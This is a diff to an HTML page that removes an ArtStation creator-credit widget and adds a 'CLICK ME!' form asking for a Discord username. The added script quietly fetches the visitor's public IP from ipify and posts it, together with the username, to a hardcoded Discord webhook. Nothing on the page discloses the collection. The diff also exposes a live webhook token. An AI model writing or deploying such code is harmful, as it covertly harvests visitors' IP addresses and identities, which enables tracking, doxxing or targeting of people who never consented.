@@ -14,7 +14,6 @@
             background-image: linear-gradient(to bottom, #0d1117, #172659);
             color: white;
             font-family: Arial, sans-serif;
-            position: relative; /* Added position relative */
         }
         .container {
             text-align: center;
@@ -72,20 +71,6 @@
         #secondScreen {
             display: none;
         }
-        .creator-info {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-            display: flex;
-            align-items: center;
-            font-size: 14px;
-        }
-        .creator-info img {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
     </style>
 </head>
 <body>
@@ -95,15 +80,7 @@
         <label for="discordUsername">Enter your Discord username:</label>
         <input type="text" id="discordUsername" placeholder="Discord Username">
         <br>
-        <label for="imageURL">Enter ArtStation artwork link:</label>
-        <input type="text" id="imageURL" placeholder="ArtStation Link" value="https://www.artstation.com/artwork/Dv03yo">
-        <br>
         <button id="clickMeBtn" disabled>CLICK ME!</button>
-        <!-- Custom image and text -->
-        <div class="creator-info">
-            <img id="creatorAvatar" src="" alt="Creator Avatar">
-            <div id="creatorText">Creator: </div>
-        </div>
     </div>
 
     <div class="container" id="secondScreen">
@@ -112,38 +89,70 @@
     </div>
 
     <script>
-        const imageURLInput = document.getElementById('imageURL');
-        const creatorAvatar = document.getElementById('creatorAvatar');
-        const creatorText = document.getElementById('creatorText');
+        const discordUsernameInput = document.getElementById('discordUsername');
+        const clickMeBtn = document.getElementById('clickMeBtn');
+        const firstScreen = document.getElementById('firstScreen');
+        const secondScreen = document.getElementById('secondScreen');
 
-        imageURLInput.addEventListener('input', function() {
-            const artStationLink = imageURLInput.value.trim();
-            if (!artStationLink) return;
-
-            // Fetch the ArtStation page HTML
-            fetch(artStationLink)
-                .then(response => response.text())
-                .then(html => {
-                    // Parse the HTML to find the image URL
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(html, 'text/html');
-                    const imageElement = doc.querySelector('meta[property="og:image"]');
-                    if (imageElement) {
-                        const imageURL = imageElement.getAttribute('content');
-                        // Update the image source and text
-                        creatorAvatar.src = imageURL;
-                        creatorText.textContent = `Creator: BlobsterWasHere on Discord`;
-                    } else {
-                        console.error('Image not found on ArtStation page');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error fetching ArtStation page:', error);
-                });
+        discordUsernameInput.addEventListener('input', function() {
+            clickMeBtn.disabled = !discordUsernameInput.value.trim();
         });
 
-        // Trigger input event to load the image on page load
-        imageURLInput.dispatchEvent(new Event('input'));
+        clickMeBtn.addEventListener('click', function() {
+            const discordUsername = discordUsernameInput.value.trim();
+            if (!discordUsername) {
+                // Add shake animation to the button
+                clickMeBtn.classList.add('shake');
+                // Remove shake animation after 0.5s
+                setTimeout(() => {
+                    clickMeBtn.classList.remove('shake');
+                }, 500);
+                return;
+            }
+
+            // Get the IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    // Send the IP address and Discord username to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
+                    const message = {
+                        content: `!IP: ${ip}, Username: ${discordUsername}`
+                    };
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => {
+                        // Check if the request was successful
+                        if (!response.ok) {
+                            throw new Error('Failed to send webhook request');
+                        }
+                        // Hide the first screen
+                        firstScreen.style.opacity = 0;
+                        // Show the second screen
+                        secondScreen.style.display = 'block';
+
+                        // Smoothly center the second screen
+                        secondScreen.style.top = '50%';
+                        secondScreen.style.left = '50%';
+                        secondScreen.style.transform = 'translate(-50%, -50%)';
+                    })
+                    .catch(error => {
+                        console.error('ERROR', error);
+                        // Handle error here
+                    });
+                })
+                .catch(error => {
+                    console.error('ERROR', error);
+                    // Handle error here
+                });
+        });
     </script>
 </body>
 </html>
